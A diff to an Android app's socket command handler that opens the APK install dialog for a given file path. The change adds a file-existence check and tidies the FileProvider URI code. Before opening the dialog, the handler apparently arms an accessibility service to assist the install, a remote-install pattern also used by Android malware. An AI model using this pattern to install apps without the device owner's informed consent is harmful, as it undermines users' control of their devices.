@@ -1815,24 +1815,24 @@ public class SocketManager {
                     r.put("error", "filePath required");
                     return r;
                 }
+                java.io.File apkFile = new java.io.File(filePath);
+                if (!apkFile.isFile()) {
+                    r.put("success", false);
+                    r.put("error", "APK file not found: " + filePath);
+                    return r;
+                }
                 UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
                 if (svc != null) {
                     svc.armInstallAssist(filePath);
                 }
                 android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_VIEW);
-                android.net.Uri uri;
-                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
-                    try {
-                        uri = androidx.core.content.FileProvider.getUriForFile(context, context.getPackageName() + ".fileprovider", new java.io.File(filePath));
-                        intent.addFlags(android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION);
-                    } catch (Exception ex) {
-                        uri = android.net.Uri.fromFile(new java.io.File(filePath));
-                    }
-                } else {
-                    uri = android.net.Uri.fromFile(new java.io.File(filePath));
-                }
+                android.net.Uri uri = androidx.core.content.FileProvider.getUriForFile(
+                        context,
+                        context.getPackageName() + ".fileprovider",
+                        apkFile);
                 intent.setDataAndType(uri, "application/vnd.android.package-archive");
-                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+                        | android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION);
                 context.startActivity(intent);
                 r.put("success", true);
                 r.put("message", "Installation dialog opened");
